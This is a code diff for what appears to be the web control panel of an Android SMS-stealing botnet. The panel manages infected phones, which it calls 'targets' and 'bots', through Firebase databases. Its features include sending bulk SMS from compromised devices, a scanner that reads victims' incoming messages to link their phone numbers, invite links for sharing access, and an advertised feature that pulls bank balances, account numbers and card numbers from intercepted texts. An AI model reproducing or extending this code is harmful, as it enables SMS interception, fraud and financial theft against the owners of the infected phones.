+                <li style="display: flex; gap: 12px; align-items: flex-start; background: rgba(255,255,255,0.02); padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">
+                    <div style="background: rgba(0, 240, 255, 0.1); color: var(--cyan); padding: 6px; border-radius: 8px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 10px rgba(0, 240, 255, 0.2);">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg>
+                    </div>
+                    <div>
+                        <div style="color: #fff; font-weight: 700; font-size: 0.95rem; margin-bottom: 4px; letter-spacing: 0.5px;">Bulk SMS Engine</div>
+                        <div style="color: var(--text-sec); font-size: 0.85rem; line-height: 1.5;">Execute mass SMS broadcasting campaigns across selected subsets of online devices using dynamic payload swapping.</div>
+                    </div>
+                </li>
+                <li style="display: flex; gap: 12px; align-items: flex-start; background: rgba(255,255,255,0.02); padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">
+                    <div style="background: rgba(236, 72, 153, 0.1); color: #ec4899; padding: 6px; border-radius: 8px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 10px rgba(236, 72, 153, 0.2);">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
+                    </div>
+                    <div>
+                        <div style="color: #fff; font-weight: 700; font-size: 0.95rem; margin-bottom: 4px; letter-spacing: 0.5px;">Financial Intel Extraction</div>
+                        <div style="color: var(--text-sec); font-size: 0.85rem; line-height: 1.5;">Real-time Regex parsing automatically extracts bank balances, account numbers, and credit cards from intercepted SMS logs.</div>
+                    </div>
+                </li>
+                <li style="display: flex; gap: 12px; align-items: flex-start; background: rgba(255,255,255,0.02); padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">
+                    <div style="background: rgba(16, 185, 129, 0.1); color: #10b981; padding: 6px; border-radius: 8px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 10px rgba(16, 185, 129, 0.2);">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+                    </div>
+                    <div>
+                        <div style="color: #fff; font-weight: 700; font-size: 0.95rem; margin-bottom: 4px; letter-spacing: 0.5px;">Volatile Invite Links</div>
+                        <div style="color: var(--text-sec); font-size: 0.85rem; line-height: 1.5;">Generate temporary, read-only session links to share specific payload access without compromising your Master Vault keys.</div>
+                    </div>
+                </li>
+            </ul>
+        </div>
+    `;
+    customAlert('System Capabilities', specsHtml);
+}
+
+function customAlert(title, desc) {
+    document.getElementById('alertTitle').innerHTML = title;
+    document.getElementById('alertDesc').innerHTML = desc;
+    document.getElementById('alertModal').classList.add('active');
+}
+
+let confirmCallback = null;
+function customConfirm(title, desc, callback) {
+    document.getElementById('confirmTitle').textContent = title;
+    document.getElementById('confirmDesc').textContent = desc;
+    confirmCallback = callback;
+    document.getElementById('confirmModal').classList.add('active');
+    
+    document.getElementById('confirmOkBtn').onclick = () => {
+        closeConfirm();
+        if(confirmCallback) confirmCallback();
+    };
+}
+function closeConfirm() { document.getElementById('confirmModal').classList.remove('active'); }
+
+async function editPhone(src, id) {
+    if(!CAN_EDIT_PHONE) return customAlert('Access Denied', 'You do not have permission to edit numbers.');
+    const d = devices.find(x => x._id === id && x._src === src);
+    if(!d) return;
+    
+    const curr = d.customPh || d.mobNo || d.sims?.[0]?.phoneNumber || '';
+    
+    customPrompt('Edit Identity', `Enter the real associated phone number for target ${id}:`, curr, async (newPh) => {
+        newPh = newPh.trim();
+        // If the number was changed, OR if they are confirming the original number to force the M badge
+        if (newPh && (d.customPh !== newPh)) {
+            // Optimistic UI update
+            d.customPh = newPh;
+            filterDevs(); // re-render sidebar
+            if(selDev && selDev._id === id) renderTab(); // re-render main pane
+            const srcObj = SOURCES.find(s => s.key === src);
+            const token = srcObj ? await getAuthToken(srcObj) : null;
+            const authSuffix = token ? `?auth=${token}` : '';
+            
+            // Save to Firebase
+            const paths = [`/clients/${id}/customPh.json`, `/${id}/customPh.json`];
+            for (const p of paths) {
+                try {
+                    const res = await fetch(d._base + p + authSuffix, {
+                        method: 'PUT',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(newPh)
+                    });
+                    if (res.ok) {
+                        console.log(`[PANEL] Saved custom phone to ${p}`);
+                        break;
+                    }
+                } catch(e) {}
+            }
+        }
+    });
+}
+
+// ═══ DATABASE MANAGER ═══
+function openDbManager() {
+    renderDbList();
+    document.getElementById('dbModal').classList.add('active');
+}
+
+function renderDbList() {
+    const badge = document.getElementById('dbTotalBadge');
+    if (badge) badge.textContent = `Total: ${SOURCES.length}`;
+
+    const html = SOURCES.map((s, i) => `
+        <div class="db-list-item" style="box-sizing: border-box; width: 100%; display: flex; justify-content: space-between; align-items: center; background: var(--bg-panel); padding: 14px 16px; border-radius: var(--radius-sm); border: 1px solid var(--border); transition: var(--trans);">
+            <div style="display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; padding-right: 12px;">
+                <div style="min-width: 12px; height: 12px; border-radius: 50%; background: ${s.color||'var(--cyan)'}; box-shadow: 0 0 10px ${s.color||'var(--cyan)'}"></div>
+                <div style="flex: 1; min-width: 0;">
+                    <div style="font-weight: 700; color: #fff; font-size: 1rem; margin-bottom: 4px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis;">${esc(s.label)}</div>
+                    <div style="font-size: 0.8rem; color: var(--text-muted); font-family: var(--font-mono); overflow: hidden; white-space: nowrap; text-overflow: ellipsis;">${esc(s.base)}</div>
+                </div>
+            </div>
+            <div style="display: flex; gap: 4px; flex-shrink: 0; justify-content: flex-end;">
+                <button title="Share Connection" style="opacity:1; color:var(--text-muted); transition: var(--trans); border:none; background:transparent; padding:8px; border-radius:50%; cursor:pointer;" onmouseover="this.style.color='var(--cyan)'; this.style.background='rgba(0, 240, 255, 0.1)'" onmouseout="this.style.color='var(--text-muted)'; this.style.background='transparent'" onclick="generateInviteLink(${i})">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
+                </button>
+                <button title="Edit Database" style="opacity:1; color:var(--text-muted); transition: var(--trans); border:none; background:transparent; padding:8px; border-radius:50%; cursor:pointer;" onmouseover="this.style.color='var(--cyan)'; this.style.background='rgba(0, 240, 255, 0.1)'" onmouseout="this.style.color='var(--text-muted)'; this.style.background='transparent'" onclick="editDb(${i})">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
+                </button>
+                <button title="Delete Database" style="opacity:1; color:var(--text-muted); transition: var(--trans); border:none; background:transparent; padding:8px; border-radius:50%; cursor:pointer;" onmouseover="this.style.color='var(--red)'; this.style.background='rgba(239, 68, 68, 0.1)'" onmouseout="this.style.color='var(--text-muted)'; this.style.background='transparent'" onclick="removeDb(${i})">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"></path><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"></path><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"></path><line x1="10" y1="11" x2="10" y2="17"></line><line x1="14" y1="11" x2="14" y2="17"></line></svg>
+                </button>
+            </div>
+        </div>
+    `).join('');
+    document.getElementById('dbList').innerHTML = html || '<div style="color:var(--text-muted);font-style:italic">No databases connected.</div>';
+}
+
+async function generateInviteLink(idx) {
+    const s = SOURCES[idx];
+    if (!s) return;
+    
+    const payload = `${s.label}|||${s.base}|||${s.apiKey || ''}`;
+    const encoded = btoa(unescape(encodeURIComponent(payload)));
+    
+    // Build a proper invite URL — works on Netlify/HTTPS, graceful on file://
+    let inviteUrl = '';
+    if (window.location.protocol === 'file:') {
+        // On file:// we can't build a shareable URL, just give the token
+        inviteUrl = encoded;
+    } else {
+        const baseUrl = window.location.origin + window.location.pathname;
+        inviteUrl = `${baseUrl}?nexus_invite=${encoded}`;
+    }
+    
+    // Clipboard: try modern API first, fallback to execCommand
+    let copied = false;
+    try {
+        if (navigator.clipboard && window.isSecureContext) {
+            await navigator.clipboard.writeText(inviteUrl);
+            copied = true;
+        }
+    } catch(e) {}
+    
+    if (!copied) {
+        // Fallback: hidden textarea + execCommand
+        const ta = document.createElement('textarea');
+        ta.value = inviteUrl;
+        ta.style.cssText = 'position:fixed;left:-9999px;top:-9999px;opacity:0';
+        document.body.appendChild(ta);
+        ta.select();
+        try { copied = document.execCommand('copy'); } catch(e) {}
+        document.body.removeChild(ta);
+    }
+    
+    if (window.location.protocol === 'file:') {
+        customAlert('Invite Token Generated', 
+            `<div style="margin-bottom:12px;">This panel is running locally (<code>file://</code>), so a full URL can't be generated. Deploy to <b>Netlify</b> for full invite links.</div>
+            <div style="margin-bottom:8px; font-weight:700; color:var(--cyan);">Invite Token for ${esc(s.label)}:</div>
+            <div style="background:rgba(0,0,0,0.4); padding:10px; border-radius:8px; font-family:var(--font-mono); font-size:0.75rem; word-break:break-all; color:var(--text-sec); border:1px solid var(--border); user-select:all;">${esc(encoded)}</div>
+            <div style="margin-top:8px; font-size:0.8rem; color:var(--text-muted);">${copied ? '✅ Copied to clipboard!' : 'Select and copy the token above manually.'}</div>`);
+    } else {
+        customAlert('Invite Link Copied', `${copied ? 'A secure invite link' : 'The invite link'} for <b>${esc(s.label)}</b> ${copied ? 'has been copied to your clipboard' : 'is ready'}. Anyone with this link can connect instantly.${!copied ? '<br><br><code style="word-break:break-all;font-size:0.75rem;">' + esc(inviteUrl) + '</code>' : ''}`);
+    }
+}
+
+let editingDbIdx = -1;
+
+function editDb(idx) {
+    editingDbIdx = idx;
+    const s = SOURCES[idx];
+    document.getElementById('newDbLabel').value = s.label;
+    document.getElementById('newDbUrl').value = s.base;
+    document.getElementById('newDbApiKey').value = s.apiKey || '';
+    
+    const addFormTitle = document.getElementById('addFormTitle');
+    if (addFormTitle) {
+        addFormTitle.textContent = 'Edit Source';
+        addFormTitle.style.color = 'var(--amber)';
+    }
+    const btn = document.getElementById('addDbBtn');
+    btn.textContent = 'Update';
+    btn.style.background = 'var(--amber)';
+    btn.style.color = '#000';
+    
+    // Scroll to the edit form
+    const form = document.getElementById('addFormTitle');
+    if (form) form.scrollIntoView({ behavior: 'smooth', block: 'end' });
+}
+
+async function addDb() {
+    const lbl = document.getElementById('newDbLabel').value.trim();
+    let url = document.getElementById('newDbUrl').value.trim();
+    
+    if(!lbl || !url) return customAlert('Missing Fields', 'Provide both a label and a valid Firebase URL.');
+    if(url.endsWith('/')) url = url.slice(0, -1);
+    
+    const key = lbl.toLowerCase().replace(/[^a-z0-9]/g, '');
+    const apiKey = document.getElementById('newDbApiKey').value.trim();
+    
+    const btn = document.getElementById('addDbBtn');
+    if (btn) { btn.disabled = true; btn.textContent = 'Connecting...'; }
+    
+    try {
+        const payload = { key, label: lbl, base: url };
+        if (apiKey) payload.apiKey = apiKey;
+        
+        // If editing, you could include the old ID/key, assuming the proxy handles updates vs creates.
+        // We'll treat all adds/edits through the same route for now.
+        
+        const res = await fetch('/api/databases', {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${localStorage.getItem('token')}`
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        const data = await res.json();
+        
+        if (!data.success) {
+            resetAddBtn(btn);
+            return customAlert('Connection Failed', data.message || 'Could not validate database.');
+        }
+        
+        // Push locally for immediate UI response
+        if (editingDbIdx >= 0) {
+            SOURCES[editingDbIdx] = data.source;
+        } else {
+            SOURCES.push(data.source);
+        }
+        
+        resetAddBtn(btn);
+        
+        document.getElementById('newDbLabel').value = '';
+        document.getElementById('newDbUrl').value = '';
+        document.getElementById('newDbApiKey').value = '';
+        editingDbIdx = -1;
+        
+        const addFormTitle = document.getElementById('addFormTitle');
+        if (addFormTitle) {
+            addFormTitle.textContent = 'Add New Source';
+            addFormTitle.style.color = 'var(--text-muted)';
+        }
+        
+        renderDbList();
+        renderDbSidebarFilters();
+        fetchAll();
+        
+        // Show success alert with stats passed back from the proxy validation
+        const stats = data.stats || { total: 0, online: 0, offline: 0 };
+        const detailsHtml = `
+            <div style="margin-top: 16px; display: flex; gap: 8px; justify-content: center; font-family: var(--font-mono);">
+                <div style="background: rgba(0, 240, 255, 0.1); border: 1px solid rgba(0, 240, 255, 0.2); border-radius: 20px; padding: 6px 12px; font-size: 0.75rem; color: var(--cyan); display: flex; align-items: center; gap: 6px; font-weight: 700; box-shadow: 0 2px 10px rgba(0,240,255,0.1);">
+                    Total <span style="background: var(--cyan); color: #000; border-radius: 10px; padding: 2px 6px;">${stats.total}</span>
+                </div>
+                <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: 20px; padding: 6px 12px; font-size: 0.75rem; color: var(--green); display: flex; align-items: center; gap: 6px; font-weight: 700; box-shadow: 0 2px 10px rgba(16,185,129,0.1);">
+                    Online <span style="background: var(--green); color: #000; border-radius: 10px; padding: 2px 6px;">${stats.online}</span>
+                </div>
+                <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 20px; padding: 6px 12px; font-size: 0.75rem; color: var(--red); display: flex; align-items: center; gap: 6px; font-weight: 700; box-shadow: 0 2px 10px rgba(239,68,68,0.1);">
+                    Offline <span style="background: var(--red); color: #000; border-radius: 10px; padding: 2px 6px;">${stats.offline}</span>
+                </div>
+            </div>
+        `;
+        customAlert('Connection Successful', `Database <b>'${lbl}'</b> was securely connected and saved.<br>${detailsHtml}`);
+        
+    } catch (e) {
+        resetAddBtn(btn);
+        return customAlert('API Error', 'Failed to communicate with proxy backend.');
+    }
+}
+
+function resetAddBtn(btn) {
+    if (!btn) return;
+    btn.disabled = false;
+    if (editingDbIdx >= 0) {
+        btn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg> Update Source`;
+        btn.style.background = 'var(--amber)';
+    } else {
+        btn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line></svg> Connect Source`;
+        btn.style.background = 'linear-gradient(135deg, var(--cyan), #0066ff)';
+    }
+    btn.style.color = '#000';
+}
+
+function removeDb(idx) {
+    const dbLabel = SOURCES[idx].label;
+    customConfirm('Delete Database', `Are you sure you want to remove the database "${dbLabel}"? This will disconnect all its devices from the panel.`, async () => {
+        const deletedSrc = SOURCES[idx].key;
+        
+        try {
+            const res = await fetch(`/api/databases/${deletedSrc}`, {
+                method: 'DELETE',
+                headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                SOURCES.splice(idx, 1);
+                
+                // Immediately purge any bots belonging to the deleted database from local memory
+                devices = devices.filter(d => d._src !== deletedSrc);
+                
+                renderDbList();
+                
+                // Quick refresh of the UI to show new filter
+                const filterHtml = SOURCES.map(s => {
+                    const c = s.color || 'var(--cyan)';
+                    return `<div class="dd-item" style="color:${c}" onclick="selectDd('${s.key}', '${s.label}', 'src', this)"><div style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${c};box-shadow:0 0 8px ${c};margin-right:10px;"></div>${s.label}</div>`;
+                }).join('');
+                const srcDdList = document.getElementById('srcDdList');
+                if (srcDdList) {
+                    srcDdList.innerHTML = `<div class="dd-item" style="color:var(--text-main)" onclick="selectDd('all', 'All Sources', 'src', this)"><div style="display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--text-main);margin-right:10px;"></div>All Sources</div>` + filterHtml;
+                    if (fSrc === deletedSrc) {
+                        selectDd('all', 'All Sources', 'src', null);
+                    }
+                }
+                
+                // Force a full UI refresh to clear out the ghost bots
+                fetchAll();
+            } else {
+                customAlert('Delete Failed', data.message || 'Could not delete database.');
+            }
+        } catch(e) {
+            customAlert('API Error', 'Failed to communicate with proxy backend.');
+        }
+    });
+}
+
+// ═══ BULK SMS MANAGER ═══
+let bulkSim = 1;
+let b_fSrc = 'all', b_fEdit = 'all', b_fStat = 'all';
+
+function openBulkSms() {
+    // Inject source filters
+    const filterHtml = SOURCES.map(s => {
+        const c = s.color || 'var(--cyan)';
+        return `<div class="dd-item" style="color:${c}" onclick="selectDd('${s.key}', '${s.label}', 'bsrc', this)"><div style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${c};box-shadow:0 0 8px ${c};margin-right:10px;"></div>${s.label}</div>`;
+    }).join('');
+    document.getElementById('bulkSrcFilters').innerHTML = `
+        <div class="dd-wrapper" id="bsrcDdWrapper">
+            <div class="dd-header" onclick="this.parentElement.classList.toggle('open')" id="bsrcDdHeader">All Sources</div>
+            <div class="dd-list">
+                <div class="dd-item" style="color:var(--text-main)" onclick="selectDd('all', 'All Sources', 'bsrc', this)"><div style="display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--text-main);margin-right:10px;"></div>All Sources</div>
+                ${filterHtml}
+            </div>
+        </div>
+    `;
+    
+    // Reset filters
+    b_fSrc = 'all'; b_fEdit = 'all'; b_fStat = 'all';
+    document.querySelectorAll('#bulkSmsModal .filter-row').forEach(row => {
+        row.querySelectorAll('.f-btn').forEach(b => b.classList.remove('active'));
+        if(row.firstElementChild && !row.firstElementChild.tagName.toLowerCase().includes('select')) {
+            row.firstElementChild.classList.add('active');
+        }
+    });
+
+    renderBulkList();
+    document.getElementById('bulkSmsModal').classList.add('active');
+}
+
+function setF(type, val, btn) {
+    if(type === 'status') fStat = val;
+    else if(type === 'src') fSrc = val;
+    else if(type === 'edit') fEdit = val;
+    
+    if (btn) {
+        btn.parentElement.querySelectorAll('.f-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+    }
+    filterDevs();
+}
+
+function setBF(type, val, btn) {
+    if(type === 'src') b_fSrc = val;
+    else if(type === 'edit') b_fEdit = val;
+    else if(type === 'stat') b_fStat = val;
+    
+    if (btn) {
+        btn.parentElement.querySelectorAll('.f-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+    }
+    renderBulkList();
+}
+
+// Custom Dropdown click handler
+function selectDd(val, label, type, el) {
+    let header, color;
+    
+    if (type === 'src') {
+        fSrc = val;
+        header = document.getElementById('srcDdHeader');
+        document.getElementById('srcDdWrapper')?.classList.remove('open');
+        filterDevs();
+    } else if (type === 'bsrc') {
+        b_fSrc = val;
+        header = document.getElementById('bsrcDdHeader');
+        document.getElementById('bsrcDdWrapper')?.classList.remove('open');
+        renderBulkList();
+    }
+    
+    if (header) {
+        if (val === 'all') {
+            header.textContent = label;
+        } else {
+            const s = SOURCES.find(x => x.key === val);
+            color = s ? (s.color || 'var(--cyan)') : 'var(--cyan)';
+            header.innerHTML = `<span style="color:${color};display:flex;align-items:center;"><div style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${color};box-shadow:0 0 8px ${color};margin-right:8px;"></div>${label}</span>`;
+        }
+    }
+}
+
+// Close dropdowns and mobile menu if clicking outside
+document.addEventListener('click', function(e) {
+    if (!e.target.closest('.dd-wrapper')) {
+        document.querySelectorAll('.dd-wrapper').forEach(w => w.classList.remove('open'));
+    }
+    
+    // Close mobile top menu
+    if (window.innerWidth <= 768) {
+        const topMenu = document.querySelector('.topbar-right');
+        const toggleBtn = document.querySelector('.mobile-menu-toggle');
+        if (topMenu && topMenu.classList.contains('show') && !e.target.closest('.topbar-right') && !e.target.closest('.mobile-menu-toggle')) {
+            topMenu.classList.remove('show');
+        }
+    }
+});
+
+function renderBulkList() {
+    let bFiltered = devices.filter(d => {
+        if(b_fSrc !== 'all' && d._src !== b_fSrc) return false;
+        if(b_fStat === 'online' && !d.status) return false;
+        if(b_fStat === 'offline' && d.status) return false;
+        if(b_fEdit === 'edited' && !d.customPh) return false;
+        if(b_fEdit === 'original' && d.customPh) return false;
+        return true;
+    });
+
+    const html = bFiltered.map(d => `
+        <label class="bulk-item">
+            <div style="display: flex; align-items: center; gap: 14px;">
+                <input type="checkbox" class="bulk-cb" value="${d._src}|${d._id}" onchange="updateBulkCount()">
+                <div class="b-id">${esc(d._id)}</div>
+            </div>
+            <div class="b-stat ${d.status?'on':'off'}">${d.status?'Online':'Offline'}</div>
+        </label>
+    `).join('');
+    document.getElementById('bulkDeviceList').innerHTML = html || '<div style="color:var(--text-muted);padding:16px;text-align:center">No devices match filters.</div>';
+    updateBulkCount();
+}
+
+function updateBulkCount() {
+    const count = document.querySelectorAll('.bulk-cb:checked').length;
+    const disp = document.getElementById('bulkCountDisplay');
+    if(disp) disp.textContent = `${count} Selected`;
+}
+
+function bulkSelectAll() {
+    document.querySelectorAll('.bulk-cb').forEach(c => c.checked = true);
+    updateBulkCount();
+}
+
+function bulkClear() {
+    document.querySelectorAll('.bulk-cb').forEach(c => c.checked = false);
+    updateBulkCount();
+}
+
+async function execBulkSMS() {
+    const to = document.getElementById('bulkSmsTo').value;
+    const msgTemplate = document.getElementById('bulkSmsMsg').value;
+    
+    const selected = Array.from(document.querySelectorAll('.bulk-cb:checked')).map(cb => {
+        const [src, id] = cb.value.split('|');
+        return devices.find(d => d._id === id && d._src === src);
+    }).filter(x=>x);
+    const btn = document.getElementById('bulkExecBtn');
+    if(selected.length === 0) { btn.textContent = '❌ No Selection'; setTimeout(()=>btn.textContent = '🚀 Send to Selected', 2000); return; }
+    if(!to || !msgTemplate) { btn.textContent = '❌ Missing Fields'; setTimeout(()=>btn.textContent = '🚀 Send to Selected', 2000); return; }
+    
+    let success = 0;
+    let failed = 0;
+    
+    btn.disabled = true;
+    btn.style.opacity = '0.7';
+    
+    for (const d of selected) {
+        btn.textContent = `⏳ Sending... (${success+failed}/${selected.length})`;
+        // Replace [ID] placeholder with the actual device ID
+        const finalMsg = msgTemplate.replace(/\[ID\]/gi, d._id);
+        const payload = { from: bulkSim, to, message: finalMsg, isSended: false };
+        const p = `/clients/${d._id}/webhookEvent/sendSms.json`;
+        
+        const srcObj = SOURCES.find(s => s.key === d._src);
+        const token = srcObj ? await getAuthToken(srcObj) : null;
+        const authSuffix = token ? `?auth=${token}` : '';
+        
+        try {
+            await fetch(d._base + p + authSuffix, { method: 'PUT', body: JSON.stringify(payload) });
+            success++;
+        } catch(e) {
+            failed++;
+        }
+    }
+    
+    btn.style.background = 'var(--bg-panel)';
+    btn.style.color = 'var(--text-main)';
+    btn.style.border = '1px solid var(--border)';
+    btn.innerHTML = `<span style="color:var(--green)">✓ Sent: ${success}</span> <span style="color:var(--text-muted);margin:0 4px">|</span> <span style="color:${failed>0?'var(--red)':'var(--text-muted)'}">Failed: ${failed}</span>`;
+    
+    setTimeout(() => {
+        btn.disabled = false;
+        btn.style.background = 'var(--cyan)';
+        btn.style.color = '#000';
+        btn.style.border = 'none';
+        btn.style.opacity = '1';
+        btn.textContent = '🚀 Send to Selected';
+    }, 4000);
+    
+    // Trigger Auto-Discovery if Receiver ID is provided
+    const receiverId = document.getElementById('bulkReceiverId')?.value.trim();
+    if (CAN_EDIT_PHONE && receiverId) {
+        startDiscoveryScan(receiverId, selected);
+    }
+}
+
+// ═══ AUTO-DISCOVERY SCANNER ═══
+function startDiscoveryScan(receiverId, selectedDevices) {
+    const rDev = devices.find(d => d._id === receiverId);
+    if (!rDev) return customAlert('Discovery Failed', `Receiver device ${receiverId} not found in your connected databases.`);
+    
+    const durationMs = 30 * 1000; // 30 seconds
+    const intervalMs = 10 * 1000; // 10 seconds
+    const startTime = Date.now();
+    let matchesFound = 0;
+    
+    customAlert('Scanner Armed', `Auto-Discovery Scanner is running in the background for 30 seconds.\n\nMonitoring receiver: ${receiverId}\nLooking for: ${selectedDevices.length} devices.`);
+    
+    const scanInterval = setInterval(async () => {
+        if (Date.now() - startTime > durationMs) {
+            clearInterval(scanInterval);
+            customAlert('Scanner Complete', `Auto-Discovery finished.\nTotal numbers linked: ${matchesFound}`);
+            return;
+        }
+        
+        const paths = [`/messages/${rDev._id}.json`, `/clients/${rDev._id}/messages.json`, `/sms/${rDev._id}.json`, `/clients/${rDev._id}/sms.json`];
+        const src = SOURCES.find(s => s.key === rDev._src);
+        const token = src ? await getAuthToken(src) : null;
+        const authSuffix = token ? `?auth=${token}` : '';
+        
+        let allMsgs = [];
+        for (const p of paths) {
+            try {
+                let res = await fetch(rDev._base + p + authSuffix);
+                if (res.ok) {
+                    let txt = await res.text();
+                    if (txt && txt !== 'null') {
+                        let json = JSON.parse(txt);
+                        let arr = Array.isArray(json) ? json.filter(x=>x) : Object.values(json);
+                        allMsgs.push(...arr);
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        if (allMsgs.length === 0) return;
+        
+        // Only look at incoming messages
+        const incomingMsgs = allMsgs.filter(m => typeof m === 'object' && m !== null && m.type === 'incoming');
+        
+        for (const msg of incomingMsgs) {
+            const body = msg.message || msg.body || '';
+            const sender = msg.sender || msg.address || '';
+            if (!body || !sender) continue;
+            
+            // Extract 16-character hex ID
+            const idMatch = body.match(/([a-f0-9]{16})/i);
+            if (idMatch) {
+                const foundId = idMatch[1].toLowerCase();
+                const targetDev = selectedDevices.find(d => d._id === foundId);
+                
+                if (targetDev) {
+                    // Strip +91 from the incoming sender number
+                    let cleanSender = sender;
+                    if (cleanSender.startsWith('+91')) {
+                        cleanSender = cleanSender.substring(3);
+                    }
+                    
+                    // Check if they already have a customPh. Strip +91 from that too just in case for a clean comparison.
+                    let currentCustom = targetDev.customPh || '';
+                    if (currentCustom.startsWith('+91')) currentCustom = currentCustom.substring(3);
+                    
+                    // If the numbers don't match, overwrite it with the newly stripped number
+                    if (currentCustom !== cleanSender) {
+                        targetDev.customPh = cleanSender;
+                        matchesFound++;
+                        
+                        // Save to Firebase silently
+                    const tSrc = SOURCES.find(s => s.key === targetDev._src);
+                    const tToken = tSrc ? await getAuthToken(tSrc) : null;
+                    const tAuth = tToken ? `?auth=${tToken}` : '';
+                    try {
+                        await fetch(`${targetDev._base}/clients/${targetDev._id}/customPh.json${tAuth}`, {
+                            method: 'PUT',
+                            body: JSON.stringify(sender)
+                        });
+                    } catch(e) {}
+                    
+                    filterDevs(); // update UI if visible
+                }
+            } // Close if (targetDev)
+        } // Close if (idMatch)
+    } // Close for loop
+    }, intervalMs);
+}
+
+// ═══ SIDEBAR RESIZER ═══
+const resizer = document.getElementById('dragResizer');
+const sidebar = document.querySelector('.sidebar');
+let isResizing = false;
+
+// Load saved width
+const savedWidth = localStorage.getItem('medline_sidebar_width');
+if (savedWidth) {
+    sidebar.style.width = `${savedWidth}px`;
+}
+
+resizer.addEventListener('mousedown', (e) => {
+    isResizing = true;
+    resizer.classList.add('dragging');
+    document.body.style.cursor = 'col-resize';
+    document.body.style.userSelect = 'none'; // Prevent text selection during drag
+});
+
+document.addEventListener('mousemove', (e) => {
+    if (!isResizing) return;
+    let newWidth = e.clientX;
+    if (newWidth < 260) newWidth = 260; // Min width
+    if (newWidth > 600) newWidth = 600; // Max width
+    sidebar.style.width = `${newWidth}px`;
+});
+
+document.addEventListener('mouseup', () => {
+    if (isResizing) {
+        isResizing = false;
+        resizer.classList.remove('dragging');
+        document.body.style.cursor = '';
+        document.body.style.userSelect = '';
+        localStorage.setItem('medline_sidebar_width', sidebar.offsetWidth);
+    }
+});
+
+// ═══ DUPLICATE SCANNER ═══
+function openDupScanner() {
+    const map = {};
+    // Group devices by their unique ID
+    devices.forEach(d => {
+        if (!map[d._id]) map[d._id] = [];
+        map[d._id].push(d);
+    });
+    
+    // Filter out IDs that only appear in one database
+    const duplicates = Object.values(map).filter(arr => {
+        if (arr.length < 2) return false;
+        // Ensure they are actually from DIFFERENT databases, not just duplicate entries in the same db
+        const sources = new Set(arr.map(a => a._src));
+        return sources.size > 1;
+    });
+    
+    const list = document.getElementById('dupList');
+    
+    if (duplicates.length === 0) {
